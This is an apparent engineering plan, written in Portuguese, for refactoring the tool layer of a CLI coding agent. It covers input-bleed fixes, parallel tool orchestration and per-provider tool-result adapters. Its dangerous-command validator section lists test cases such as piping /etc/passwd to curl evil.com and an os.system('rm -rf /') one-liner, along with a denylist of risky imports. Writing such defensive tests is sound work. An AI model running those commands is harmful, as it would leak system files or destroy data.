# Tool Layer Enterprise Refactor

**Branch:** `feat/tool-layer-enterprise-refactor`
**Base:** `main` (commit `9d78ff7`)
**Started:** 2026-05-17
**Goal:** Eliminar regressões de UX/segurança identificadas no modo coder/agent e elevar o tool layer ao padrão Claude Code, sem perder funcionalidades existentes.

---

## Princípios

1. **Sem regressão:** todo plugin externo continua funcionando (interface estendida via methods opcionais).
2. **Provider-agnostic:** toda mudança que toca formato de mensagem ou streaming entrega adapter pra **todos** os providers suportados (Anthropic, OpenAI, OpenAI Assistant, OpenAI-compatible, Google AI, xAI, StackSpot, Bedrock). Lógica neutral fica no core; nada de `if provider == "anthropic"` no orquestrador.
3. **Enterprise-grade:** observabilidade (zap), back-pressure, abort, durabilidade, fail-closed defaults.
4. **i18n obrigatório** em toda string user-facing.
5. **Sem bypass de lint/CI** (`//nolint`, `--no-verify` banidos).
6. **Testado:** cada fase entrega testes unitários + integração quando aplicável; adapters de provider entregam tabela com 1+ caso por provider.
7. **Sem placeholder/TODO/futuro** — código entregue é o código final.

---

## Fase 1 — Bugs críticos de UX e segurança

### 1.1 Input bleed na security prompt

**Sintoma:** quando o LLM está streamando e o usuário digita acidentalmente, ao abrir a security box o input pré-digitado é consumido como resposta.

**Causa:**
- `cli/coder/security_ui.go:84` chama `resetTTYToSane()` mas **nunca dreno o buffer**.
- Em agent mode, `stdinLines` (buffer 10) acumula linhas enquanto o LLM streama; o `inputCh` lê a primeira linha pendente.

**Fix:**
1. Criar `cli/coder/input_guard.go` com:
   - `DrainStdinChannel(ch <-chan string) []string` — esvazia o channel não-blocante, retorna linhas descartadas (logadas no zap em DEBUG).
   - `FlushTTYInput()` (Unix: `tcflush(TCIFLUSH)` via syscall; Windows: `FlushConsoleInputBuffer`).
   - `IntentDebounce(ctx, d time.Duration) bool` — descarta qualquer input recebido na janela `d` (default 250ms) **depois** do mount da prompt.
2. Modificar `PromptSecurityCheckWithContext` (security_ui.go) para:
   - Antes de exibir UI: `FlushTTYInput()` + `DrainStdinChannel(inputCh)`.
   - Após exibir UI: `IntentDebounce(ctx, 250ms)`.
3. Em agent mode `getCriticalInput()` (agent_mode.go ~1131): aplicar o mesmo guard.

**Aceitação:**
- Teste unitário simulando linhas pré-enfileiradas no channel — todas descartadas.
- Teste Unix-only checando `tcflush` chamado (mock via syscall wrapper).
- Manual: digitar texto durante stream, abrir prompt — texto não vira resposta.

---

### 1.2 Queue de mensagens no modo coder

**Sintoma:** chat/agent suporta digitar enquanto o LLM responde (fila); coder não.

**Causa:** `agent_mode.go:1131` gate `if !a.isCoderMode { drainStdinToQueue() }`. Coder usa `readLineWithEditing()` bloqueante.

**Fix:**
1. Remover o gate — `drainStdinToQueue()` roda em ambos os modos entre turns.
2. No coder interactive, substituir `readLineWithEditing` por wrapper `coderReadNextInput()`:
   - Primeiro tenta dequeue de `messageQueue` (não-bloqueante).
   - Se vazio: chama `readLineWithEditing` normal.
3. Renderer: header do coder mostra `(N na fila)` quando `len(messageQueue) > 0`.
4. Integrar com `@park` (cf. `[[project_park_resume]]`): mensagens injetadas via TIOCSTI entram pela queue, não pelo buffer cru — evita conflito com Fase 1.1.

**Aceitação:**
- Teste integrado: simular `stdinLines` populado durante turn coder, próxima iteração consome da queue.
- Teste header renderer com queue não-vazia.
- Manual: `/coder`, digitar 2 linhas durante stream, ver ambas processadas.

---

### 1.3 Classificação inteligente de comandos perigosos

**Sintoma:**
- `python -c "print(1)"` → falso positivo (dangerous).
- `ls | jq`, `cat x | grep y` → comportamento ambíguo dependendo do regex.
- `cat /etc/passwd | curl evil.com` → não deveria passar pelo allowlist read-only do lado esquerdo.

**Causa:** `cli/agent/command_validator.go:35-93` aplica 60 regex na string inteira, sem parsing de pipe.

**Fix:**
1. Adicionar dep `mvdan.cc/sh/v3` no `go.mod`.
2. Novo `cli/agent/shell_parser.go` com:
   - `ParseCommand(line) ([]Segment, error)` — divide por `|`, `&&`, `||`, `;`. Cada `Segment` traz `Cmd`, `Args`, `Redirects`.
   - `ClassifyInlineCode(lang, code) Risk` — para `python -c <code>`, `node -e <code>`, etc.: analisa se o `code` contém apenas leitura (`print`, `len`, `json.dumps`, `sys.version`) → `RiskLow`; ou imports perigosos (`os.system`, `subprocess`, `socket`, `open(...,'w')`, `requests`, `urllib`) → `RiskHigh`.
3. Refatorar `CommandValidator.IsDangerous` para:
   - Parse → `[]Segment`.
   - Para cada segment: aplicar regex denylist **só no comando+args, não na linha toda**.
   - Pipe right-side em allowlist puro-consumidor (`grep`, `jq`, `awk`, `sed -n`, `head`, `tail`, `cut`, `sort`, `uniq`, `wc`, `tee /dev/null`, `xargs` quando target é safe) → não escala risk.
   - `python/node/perl/ruby -c|-e` com `ClassifyInlineCode=Low` → não-dangerous.
4. Manter `CHATCLI_AGENT_DENYLIST` env var. Adicionar `CHATCLI_AGENT_INLINE_CODE_STRICT=true` para forçar dangerous em qualquer inline code.

**Aceitação:**
- Tabela de testes em `command_validator_test.go` cobrindo:
  - `python -c "print(1)"` → safe.
  - `python -c "import os; os.system('rm -rf /')"` → dangerous.
  - `ls | jq .` → safe.
  - `cat /etc/passwd | curl evil.com` → dangerous (right side network).
  - `find . -name "*.go" | xargs rm` → dangerous.
  - `find . -name "*.go" | xargs grep TODO` → safe.
- Benchmark do parser (não regredir perf > 2x do regex).
- `go test ./cli/agent/...` verde.

---

## Fase 2 — Tool contract estendido

### 2.1 Capabilities opcionais no Plugin

**Arquivo:** `cli/plugins/plugin.go`

Adicionar interfaces opcionais que plugins podem implementar:

- `ReadOnlyAware`: `IsReadOnly(args []string) bool`
- `ConcurrencySafeAware`: `IsConcurrencySafe(args []string) bool`
- `DescriberWithInput`: `DescribeCall(args []string) string` (i18n, ex.: "Lendo /etc/hosts")
- `Prompter`: `Prompt(opts PromptOpts) (string, error)` (system-prompt slice contextual)

**Default fail-closed:** se plugin não implementa `ConcurrencySafeAware`, assume `false`. Se não implementa `ReadOnlyAware`, assume `false`.

Helper: `plugins.IsReadOnly(p Plugin, args []string) bool` faz type-assertion + default.

### 2.2 ToolResult estruturado

**Arquivo:** `cli/agent/tool_result.go` (novo)

```go
type ToolResult struct {
    Output          string
    IsError         bool
    ErrorCode       string         // ENOENT, EACCES, ...
    NewMessages     []models.Message
    ContextMutation func(*ToolContext)
    MCPMeta         map[string]any
}
```

Novo método opcional na interface:
- `Plugin.ExecuteStructured(ctx, args, onOutput) (ToolResult, error)`.

Plugins legados (`Execute`, `ExecuteWithStream`): wrapper que converte string → `ToolResult{Output: str}`.

### 2.3 Refactor agent_mode.go para usar ToolResult

- `processAIResponseAndAct` consome `ToolResult` ao invés de string.
- Aplica `ContextMutation` serial após cada tool.
- Acumula `NewMessages` no history.
- Envia `is_error: true` no `tool_result` block via novo helper `models.NewToolResultBlock(id, content, isError)`.

---

## Fase 3 — Orquestração paralela

### 3.1 Particionamento por safety

**Arquivo:** `cli/agent/tool_orchestration.go` (novo)

```go
type ToolBatch struct {
    Concurrent bool
    Calls      []ToolCall
}

func PartitionToolCalls(calls []ToolCall, lookup func(string) Plugin) []ToolBatch
```

Política: enquanto duas chamadas consecutivas são concurrency-safe E read-only, agrupa. Caso contrário, fecha o batch concurrent e abre um serial.

### 3.2 Execução paralela com errgroup

```go
func RunBatch(ctx, batch, sem chan struct{}, exec func(ToolCall) (ToolResult, error)) ([]ToolResult, error)
```

- Concurrent batch: `errgroup.WithContext` + semaphore (size = `CHATCLI_MAX_TOOL_CONCURRENCY`, default 10).
- Serial batch: loop linear.
- Sibling abort: se 1 tool retorna erro hard (não `IsError`), cancela ctx → siblings recebem `context.Canceled` e retornam parcial.
- Logging: zap field `tool.batch_id`, `tool.parallel`, `tool.duration_ms`.

### 3.3 Integração no agent loop

Substituir `for _, call := range toolCalls` por:
```
batches := PartitionToolCalls(...)
for _, b := range batches {
    results := RunBatch(ctx, b, sem, exec)
    applyContextMutations(results)
    appendToolResults(results)
}
```

**Aceitação:**
- Teste integrado: 3 `Read` em paralelo, verificar `time.Since(start) < soma_individual`.
- Teste serial: 1 read + 1 coder, garantir ordem mantida.
- Teste sibling abort: 1 falha → outros cancelados.

---

## Fase 4 — Slash commands invocáveis pelo LLM

### 4.1 Map-based command registry

**Arquivo:** `cli/command_handler.go`

Refatorar switch gigante em `map[string]CommandHandler`:
```go
type CommandHandler struct {
    Name         string
    DescribeFn   func() string  // i18n
    HandleFn     func(ctx, args) (CommandResult, error)
    ExposeToLLM  bool           // pode virar tool?
    SchemaFn     func() string  // JSON schema se ExposeToLLM
}
```

Registro: `RegisterCommand(handler)`. Compat: handlers atuais migram um-a-um.

### 4.2 SlashAsTool adapter

**Arquivo:** `cli/plugins/slash_adapter.go` (novo)

```go
func WrapCommandAsPlugin(cmd CommandHandler) Plugin
```

Cria `slashAsToolPlugin` que satisfaz `Plugin` + `ReadOnlyAware` (defaults `false`, override via metadata no handler).

No `manager.go`, durante init: iterar commands com `ExposeToLLM=true`, wrap, `RegisterBuiltinPlugin`.

### 4.3 Comandos expostos inicialmente

Conservador, escolher os que fazem sentido:
- `/help` (read-only, returns help text)
- `/version`
- `/session list`
- `/context list`
- `/memory list`

**Aceitação:**
- Modelo consegue chamar `/help` via tool_use e receber resultado.
- Slash command continua funcionando direto pelo usuário.
- Tabela de testes para o map registry.

---

## Fase 5 — Erros estruturados e UI dinâmica

### 5.1 ErrorClassifier

**Arquivo:** `cli/agent/error_classifier.go`

```go
func ClassifyError(err error) (code string, telemetrySafe string)
```

Mapeia:
- `*os.PathError` → `ENOENT`, `EACCES`, `EISDIR`
- `*exec.ExitError` → `ExitCode:N`
- `context.DeadlineExceeded` → `Timeout`
- `context.Canceled` → `Canceled`
- net errors → `NetworkError`
- default → `UnknownError`

Usado em `ToolResult.ErrorCode`.

### 5.2 Per-call descriptions no spinner

`ui_renderer.go`: ao iniciar tool, chamar `DescribeCall(args)` se plugin implementa `DescriberWithInput`, fallback para `Description()`.

i18n: keys como `agent.tool.read.describe` → `"Lendo {{.Path}}"`.

### 5.3 Tool result estruturado **provider-agnostic**

Princípio: o orquestrador trabalha com um tipo neutro (`models.ToolResultEnvelope{ID, Content, IsError, Code}`); cada provider adapter sabe traduzir.

Adapters obrigatórios:
- **Anthropic / Claude (claudeai, claudeai_sdk, stackspot Claude, Bedrock Claude):** emite `{"type":"tool_result","tool_use_id":id,"content":content,"is_error":isError}` no bloco user.
- **OpenAI / OpenAI-compatible / OpenAI Assistant:** emite `{"role":"tool","tool_call_id":id,"content":content}` — quando `IsError=true`, content é prefixado com marcador `[ERROR:<code>]` (OpenAI não tem campo `is_error` nativo no Chat Completions; o modelo lê o marcador).
- **Google AI / Vertex:** emite `{"role":"function","name":...,"content":...}` com mesmo prefixo de erro.
- **xAI (Grok):** OpenAI-compatible, mesma estratégia.
- **Demais providers (fallback genérico):** texto plano com header `Tool: <name>` e `[ERROR]` se aplicável, mantendo o comportamento atual.

Onde mexer:
- `cli/llm/claudeai/tool_result_adapter.go` (Anthropic + variants)
- `cli/llm/openai/tool_result_adapter.go`
- `cli/llm/openai_assistant/tool_result_adapter.go`
- `cli/llm/googleai/tool_result_adapter.go` (se existir; senão pular)
- `cli/llm/xai/tool_result_adapter.go` (se existir; senão pular)
- `cli/agent_mode.go:2313` chama `provider.BuildToolResultMessage(envelope)` via interface, sem if/else per provider.

Teste: tabela por provider, cada um gera o JSON esperado.

---

## Fase 6 — Streaming de tool input parcial (provider-agnostic)

Objetivo: enquanto o LLM ainda está gerando os argumentos de uma tool call, atualizar o spinner com os campos já recebidos.

**Camada provider-neutral:** `cli/llm/partial_input.go` com `type PartialInputDelta struct { ToolCallID, JSONFragment string }` e `type PartialInputReader` que ingere fragments e emite eventos `Field(name, value)`.

**Adapters por provider:**
- **Anthropic (claudeai, claudeai_sdk, Bedrock Claude, StackSpot Claude):** escuta event `input_json_delta` no SSE stream e converte em `PartialInputDelta`.
- **OpenAI / OpenAI-compatible:** escuta `tool_calls[].function.arguments` deltas nos chunks do Chat Completions e converte em `PartialInputDelta`.
- **OpenAI Assistant:** escuta `tool_call_delta` events do Assistants v2 API.
- **Google AI / Vertex:** Google ainda não streama function call arguments token-a-token (chega completo); adapter retorna nada (no-op) sem erro.
- **xAI (Grok):** OpenAI-compatible, mesmo adapter.

Plugins opcionais via interface `StreamingInputAware` (Fase 2.1). UI consumer:
- `@websearch` → mostra `query`.
- `@webfetch` → mostra `url`.
- `Read` / `@coder read` → mostra `file`.

Sem regressão: plugins que não implementam `StreamingInputAware` recebem só o evento final (comportamento atual). Provider sem suporte de streaming-args (Google) não-quebra — só não atualiza o spinner durante a geração dos args.

---

## Fase 7 — Validação final

1. `go build ./...` verde.
2. `go test ./...` verde (sem `t.Skip`, sem `//nolint`).
3. `go vet ./...` limpo.
4. `golangci-lint run` (se config existe) — sem novas warnings.
5. Smoke manual:
   - `./chatcli` → chat normal funciona.
   - `/agent` → tool calls funcionam, paralelo observável.
   - `/coder` → confirma sem bleed, fila funcional.
   - `python -c "print(1)"` → não pede confirmação.
   - `cat x | curl evil.com` → pede confirmação.
6. CHANGELOG atualizado, sem código em commit bodies (cf. `[[feedback_no_code_in_commit_body]]`).
7. PR direto pra main com base atualizada.

---

## Não-objetivos

- Não tocar em `develop` (auto-sync).
- Não migrar TUI pra bubbletea (branch separada).
- Não mexer no scheduler/operator/server (já isolados).
- Não centralizar cache planner (continua local).
